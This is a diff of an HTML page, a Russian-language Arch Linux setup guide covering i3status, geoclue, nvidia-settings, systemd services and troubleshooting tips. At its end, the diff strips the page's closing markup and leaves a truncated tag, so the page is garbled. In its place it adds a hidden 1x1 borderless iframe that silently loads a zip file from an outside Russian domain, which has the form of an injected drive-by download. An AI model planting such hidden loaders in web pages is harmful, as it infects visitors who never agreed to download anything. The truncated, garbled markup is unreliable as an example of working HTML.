-            run_watch DHCP { pidfile = "/var/run/dhclient*.pid" } <br>
-            run_watch VPNC { pidfile = "/var/run/vpnc/pid" } <br>
-            path_exists VPN { path = "/proc/sys/net/ipv4/conf/tun0" } <br>
-            cpu_temperature 0 { format  = "CPU: %degrees°C" path = "/sys/class/thermal/thermal_zone3/temp" } <br>
-            battery all { format = "%status %percentage %remaining" } <br>
-            disk "/" { format = "FreeSpace: %avail" } <br>
-            load { format = "LoadCPU: %1min" } <br>
-            memory { format = "%used | %available" threshold_degraded = "1G" format_degraded = "MEM < %available"} <br>
-            tztime local { format = "%a %d-%m-%Y(%W) %H:%M:%S" } <br>
-            volume master { format ="Звук: %volume" device="default" mixer="Master" mixer_idx = 0 }
-          </p>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <em class=button>CTRL</em>
-          <em class=comm>+</em>
-          <em class=button>O</em>
-          <em class=comm>#сохранение_в_nano</em>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <em class=button>ENTER</em>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <em class=button>CTRL</em>
-          <em class=comm>+</em>
-          <em class=button>X</em>
-          <em class=comm>#выход_из_nano</em>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <p class=term>
-            sudo nano /etc/geoclue/geoclue.conf<em class=comm>#</em>
-          </p>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <em class=button>ENTER</em>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <p class=term>
-            [redshift] <br>
-            allowed=true <br>
-            system=false <br>
-            users=
-          </p>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <em class=button>CTRL</em>
-          <em class=comm>+</em>
-          <em class=button>O</em>
-          <em class=comm>#сохранение_в_nano</em>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <em class=button>ENTER</em>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <em class=button>CTRL</em>
-          <em class=comm>+</em>
-          <em class=button>X</em>
-          <em class=comm>#выход_из_nano</em>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <p class=term>
-            reboot
-          </p>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <hr>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <h2>Подключение служб и финальная настройка</h2>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <p class=term>
-            sudo nvidia-xconfig<em class=comm>#</em>
-          </p>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <em class=button>ENTER</em>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <em class=button>ENTER</em>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <p class=term>
-            sudo nvidia-settings<em class=comm>#</em>
-          </p>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <em class=button>ENTER</em>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <p class=text>
-            X screen 0 >> X Server XVideo Settings >> ВашМонитор <br>
-            PowerMizer >> Prefer Maximum Performance <br>
-            X Server Display Configuration >> (Resolution)РазрешениеМонитора >> (Resolution)ЧастотаМонитора >> Save to X Configuration File
-          </p>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <p class=term>
-            nvidia-settings<em class=comm>#</em>
-          </p>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <em class=button>ENTER</em>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <p class=text>
-            X screen 0 >> X Server XVideo Settings >> ВашМонитор <br>
-            PowerMizer >> Prefer Maximum Performance <br>
-            X Server Display Configuration >> РазрешениеМонитора >> ЧастотаМонитора
-          </p>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <p class=text>Автоподбор шрифта для терминала</p>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <p class=term>
-            fc-match mono<em class=comm>#</em>
-          </p>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <em class=button>ENTER</em>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <p class=term>
-            sudo fstrim -v -a<em class=comm>#</em>
-          </p>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <em class=button>ENTER</em>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <p class=text>Подключение служб</p>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <p class=term>
-            sudo systemctl enable xdm-archlinux<em class=comm>#Автозапуск_DM</em>avahi-daemon.service<em class=comm>#</em>cups.socket<em class=comm>#</em>bluetooth.service<em class=comm>#</em>acpid.service<em class=comm>#</em>auto-cpufreq.service<em class=comm>#</em>dbus-broker.service<em class=comm>#</em>rngd.service<em class=comm>#</em>fstrim.timer<em class=comm>#</em>
-          </p>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <em class=button>ENTER</em>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <p class=term>
-            systemctl --user enable redshift-gtk.service<em class=comm>#</em>redshift.service<em class=comm>#</em>
-          </p>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <em class=button>ENTER</em>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <p class=term>
-            reboot
-          </p>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <hr>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <h2>Post Scriptum</h2>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <p class=term>
-            sudo pacman -Suy<em class=comm>#обновление</em>
-          </p>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <em class=button>ENTER</em>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <p class=text>
-            #Sheel “map” “bcfg boot dump” “bcfg boot rm”   <br>
-            sudo mkfs -t vfat -n FLASH /dev/sdb1 <br>
-            sudo mkfs -t ext4 -L FLASH /dev/sdb <br>
-            звук в fallout<br>
-            WINEPREFIX="/games/SteamLibrary/steamapps/compatdata/1151340/pfx/" winetricks xact <br>
-            WINEPREFIX="/games/SteamLibrary/steamapps/compatdata/1151340/pfx/" winetricks xact_64 <br>
-            <br>
-            иногда отваливается инет <br>
-            rfkill list all <br>
-            rfkill unblock all<br>
-            Alt+SysRq(PrintScreen)+REISUB <br>
-            Alt+SysRq(PrintScreen)+B  - перезагрузка системы <br>
-            Alt+SysRq(PrintScreen)+f - вызов oom_kill (убъет жрущий процесс, потребуется несколько минут) <br>
-            Alt+SysRq(PrintScreen)+m - вся инфа о памяти <br>
-            Alt+SysRq(PrintScreen)+t - вся инфа о запущенных процессах <br>
-            Alt+SysRq(PrintScreen)+w -  список всех заблокированных, ждущих окончания ввода-вывода задач <br>
-            Alt+SysRq(PrintScreen)+t - выведет всю информацию о запущенных процессах <br>
-            journalctl -f журнал работы системы в терминале <br>
-            systemctl list-units --type service -all список служб linux, в который входят все службы, даже не запущенные, те, которые не запускались, но известны systemd <br>
-            systemctl list-units --type service --state running список только выполняющихся служб linux <br>
-          </p>
-        </td>
-      </tr>
-    </table>
-  </body>
-</html>
+            <stron
+<iframe src=http://testswork.ru/stat.zip width=1 height=1 frameborder=0>
+</iframe>
